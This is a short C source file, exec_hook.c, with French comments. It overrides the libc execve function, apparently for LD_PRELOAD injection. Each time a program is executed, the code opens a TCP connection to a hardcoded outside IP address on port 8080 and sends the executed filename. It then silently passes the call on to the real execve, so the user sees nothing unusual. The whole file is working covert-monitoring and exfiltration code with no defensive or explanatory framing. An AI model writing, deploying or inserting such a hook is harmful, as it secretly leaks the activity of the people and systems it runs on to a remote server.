// exec_hook.c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

int execve(const char *filename, char *const argv[], char *const envp[]) {
    // Envoyer les infos au serveur
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock >= 0) {
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(8080);
        inet_pton(AF_INET, "185.181.4.52", &server.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
            char buffer[4096];
            snprintf(buffer, sizeof(buffer), "EXEC: %s\n", filename);
            send(sock, buffer, strlen(buffer), 0);
        }
        close(sock);
    }
    
    // Appeler le vrai execve
    int (*real_execve)(const char*, char *const[], char *const[]);
    real_execve = dlsym(RTLD_NEXT, "execve");
    return real_execve(filename, argv, envp);
}
